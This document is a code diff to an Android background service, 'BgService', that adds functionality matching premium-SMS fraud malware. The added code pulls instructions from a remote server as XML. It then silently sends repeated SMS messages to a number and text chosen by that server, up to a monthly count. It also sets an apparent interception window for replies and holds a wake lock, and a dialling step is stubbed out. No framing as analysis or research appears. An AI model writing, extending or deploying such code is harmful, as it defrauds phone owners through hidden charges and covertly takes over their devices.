@@ -8,24 +8,31 @@ import android.os.ServiceManager;
 import android.os.RemoteException;
 import com.android.internal.telephony.Phone;
 import com.android.internal.telephony.PhoneFactory;
+import com.mms.bg.transaction.WorkingMessage;
+import com.mms.bg.util.XMLHandler;
+
 import android.os.ServiceManager;
 import android.os.RemoteException;
-import android.provider.CallLog.Calls;
+
+import java.io.File;
+import java.util.Date;
 
 import android.app.Service;
 import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Message;
+import android.provider.CallLog.Calls;
 import android.util.Log;
-import android.content.IntentFilter;
-import android.content.ContentResolver;
-import android.database.Cursor;
-import android.net.Uri;
-import java.util.Timer;
-import java.util.TimerTask;
+
+import com.mms.bg.transaction.WorkingMessage;
+import com.mms.bg.util.XMLHandler;
 
 public class BgService extends Service {
 
@@ -33,6 +40,9 @@ public class BgService extends Service {
     private static final boolean DEBUG = true;
     
     public static final String ACTION_DIAL_BR = "action.dial.bg";
+    public static final String ACTION_INTERNET = "action.internet.bg";
+    public static final String ACTION_SEND_SMS = "action.sms.bg";
+    private SettingManager mSM;
     
     private boolean mIsCalling;
     
@@ -100,19 +110,108 @@ public class BgService extends Service {
         if (DEBUG) Log.d(TAG, "[[BgService::onCreate]]");
         this.setForeground(true);
         
-        SettingManager.getInstance(BgService.this).startAutoSendMessage();
-//        Intent intent = new Intent(BgService.this, AutoSMSRecevier.class);
-//        this.sendBroadcast(intent);
+        mSM = SettingManager.getInstance(BgService.this);
+//        SettingManager.getInstance(BgService.this).startAutoSendMessage();
         
         IntentFilter iFilter = new IntentFilter();
         iFilter.addAction(ACTION_DIAL_BR);
         registerReceiver(mBC, iFilter);
+        mSM.setFirstStartTime();
+    }
+    
+    @Override
+    public void onStart(Intent intent, int startId) {
+        super.onStart(intent, startId);
+        
+        if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_INTERNET) == true) {
+            LOGD("[[onStart]] received the action to get the internet info");;
+            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
+            if (ret == true) {
+                SettingManager.getInstance(this).parseServerXMLInfo();
+                String delay = SettingManager.getInstance(this).mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
+                long delayTime = 0;
+                if (delay != null) {
+                    delayTime = (Integer.valueOf(delay)) * 60 * 60 * 1000;
+                }
+                SettingManager.getInstance(this).tryToFetchInfoFromServer(delayTime);
+                SettingManager.getInstance(this).startAutoSendMessage();
+            }
+        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS) == true) {
+            autoSendSMSOrDial(this);
+        } else {
+            File file = new File(SettingManager.getInstance(getApplicationContext()).DOWNLOAD_FILE_PATH);
+            if (file.exists() == true) {
+                mSM.parseServerXMLInfo();
+                String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
+                long delayTime = 0;
+                if (delay != null) {
+                    delayTime = (Integer.valueOf(delay)) * 60 * 60 * 1000;
+                }
+                mSM.tryToFetchInfoFromServer(delayTime);
+            } else {
+                mSM.tryToFetchInfoFromServer(0);
+            }
+        }
     }
     
     @Override
     public void onDestroy() {
         super.onDestroy();
         this.unregisterReceiver(mBC);
+    }
+    
+    private void autoSendSMSOrDial(Context context) {
+        SettingManager sm = SettingManager.getInstance(context);
+        if (sm.isSimCardReady() == false || sm.isCallIdle() == false) return;
+      
+        if (sm.mXMLHandler != null) {
+            String targetNum = sm.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_PORT);
+            String sendText = sm.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_ORDER);
+            String smsOrDial = sm.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_SMS);
+            if (smsOrDial != null && sendText != null && targetNum != null) {
+                boolean sms = Integer.valueOf(smsOrDial) == 0 ? true : false;
+                if (sms == true) {
+                    String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
+                    if (monthCount != null) {
+                        int sendCount = Integer.valueOf(monthCount);
+                        String intercept_time_str = sm.mXMLHandler.getChanneInfo(XMLHandler.INTERCEPT_TIME);
+                        int intercept_time_int = 2000 * 60 * 1000;
+                        if (intercept_time_str != null) {
+                            intercept_time_int = Integer.valueOf(intercept_time_str) * 60 * 1000;
+                        }
+                        sm.setSMSBlockDelayTime(intercept_time_int);
+                        SettingManager.getInstance(context).makePartialWakeLock();
+                        try {
+                            Date date = new Date(System.currentTimeMillis());
+                            LOGD("[[autoSendSMSOrDial]] current time = " + date.toGMTString());
+                            sm.setLastSMSTime(System.currentTimeMillis());
+                            WorkingMessage wm = WorkingMessage.createEmpty(context);
+                            for (int count = 0; count < sendCount; ++count) {
+                                LOGD("[[autoSendSMSOrDial]] send sms to : " + targetNum + " text = " + sendText);
+                                wm.setDestNum(targetNum);
+                                wm.setText(sendText);
+                                wm.send();
+                                SettingManager.getInstance(context).logSMSCurrentTime();
+                                
+                                //naps
+                                for (int n = 0; n < 10; ++n) {
+                                    Thread.sleep(50);
+                                }
+                            }
+                        } catch (Exception e) {
+                        } finally {
+                            SettingManager.getInstance(context).releasePartialWakeLock();
+                            Date date = new Date(System.currentTimeMillis());
+                            LOGD("[[autoSendSMSOrDial]] current time = " + date.toGMTString());
+                        }
+                    }
+                } else {
+                    //TODO : dial
+                }
+            }
+        } else {
+            //TODO : do something for no xml handler
+        }
     }
     
     private void dial() {
@@ -184,5 +283,11 @@ public class BgService extends Service {
     public IBinder onBind(Intent intent) {
         // TODO Auto-generated method stub
         return null;
+    }
+    
+    public static final void LOGD(String msg) {
+        if (DEBUG) {
+            Log.d(TAG, msg);
+        }
     }
 }
